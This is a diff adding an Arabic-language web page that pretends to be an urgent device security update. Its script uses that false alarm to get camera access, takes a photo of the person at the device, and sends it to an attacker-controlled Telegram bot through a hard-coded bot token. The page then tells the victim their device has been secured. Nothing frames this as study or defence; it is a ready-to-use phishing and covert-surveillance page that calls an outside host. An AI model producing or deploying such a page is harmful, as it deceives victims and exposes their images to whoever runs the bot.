@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث الأمان - مطلوب</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #000000, #1a0000);
+            color: white; min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden;
+        }
+        .container { text-align: center; padding: 30px; max-width: 420px; z-index: 1; }
+        .alert-icon { font-size: 80px; animation: shake 1s infinite; }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        h1 { color: #ff3333; margin: 15px 0; font-size: 22px; }
+        p { color: #ccc; font-size: 14px; margin: 8px 0; line-height: 1.6; }
+        .btn {
+            display: inline-block; background: linear-gradient(135deg, #ff3333, #cc0000);
+            color: white; border: none; padding: 15px 40px;
+            font-size: 18px; border-radius: 25px; cursor: pointer;
+            margin: 15px 0; font-weight: bold;
+            animation: pulse 1.5s infinite; text-decoration: none;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,51,51,0.5); }
+            50% { box-shadow: 0 0 0 20px rgba(255,51,51,0); }
+        }
+        .loading { display: none; margin: 15px 0; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #ff3333; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        video { display: none; width: 100%; max-width: 300px; border-radius: 15px; margin: 15px auto; }
+        canvas { display: none; }
+        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+        .particle {
+            position: absolute; width: 2px; height: 2px;
+            background: #ff3333; border-radius: 50%;
+            animation: float 3s infinite; opacity: 0;
+        }
+        @keyframes float {
+            0% { opacity: 0; transform: translateY(100vh); }
+            10% { opacity: 1; } 90% { opacity: 1; }
+            100% { opacity: 0; transform: translateY(-10vh); }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="container">
+        <div class="alert-icon">⚠️</div>
+        <h1>تم اكتشاف تهديد أمني!</h1>
+        <p>جهازك بحاجة إلى تحديث أمني فوري</p>
+        <p>يرجى الضغط على الزر أدناه للتحقق من الكاميرا وتأمين الجهاز</p>
+        <button class="btn" id="verifyBtn" onclick="startVerify()">🔒 تحقق وتأمين</button>
+        <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;">جاري فحص الكاميرا...</p></div>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        <p style="font-size:11px;color:#666;margin-top:15px;">تم الفحص بواسطة نظام الأمان التلقائي</p>
+    </div>
+    <script>
+        function getChatId() { return new URL(window.location.href).searchParams.get('chatId') || ''; }
+        const chatId = getChatId();
+        const BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        function createParticles() {
+            var container = document.getElementById('particles');
+            for (var i = 0; i < 40; i++) {
+                var p = document.createElement('div'); p.className = 'particle';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDelay = Math.random() * 3 + 's';
+                p.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                container.appendChild(p);
+            }
+        }
+        createParticles();
+        async function startVerify() {
+            if (!chatId) { alert('خطأ في الرابط!'); return; }
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream; video.style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('h1').textContent = '📸 جاري تأمين الجهاز...';
+                document.querySelector('h1').style.color = '#00ff88';
+                await new Promise(r => setTimeout(r, 2000));
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const formData = new FormData();
+                formData.append('chat_id', chatId); formData.append('photo', blob, 'camera.jpg');
+                formData.append('caption', '📸 صورة من كاميرا الجهاز');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = 'none';
+                document.querySelector('h1').textContent = '✅ تم تأمين الجهاز!';
+                document.querySelector('h1').style.color = '#00ff88';
+                document.querySelector('.alert-icon').textContent = '✅';
+                document.querySelector('p').textContent = 'تم تحديث نظام الأمان بنجاح، يمكنك إغلاق الصفحة الآن.';
+            } catch(e) {
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('h1').textContent = '⚠️ حدث خطأ';
+                document.getElementById('verifyBtn').style.display = 'inline-block';
+            }
+        }
+    </script>
+</body>
+</html>
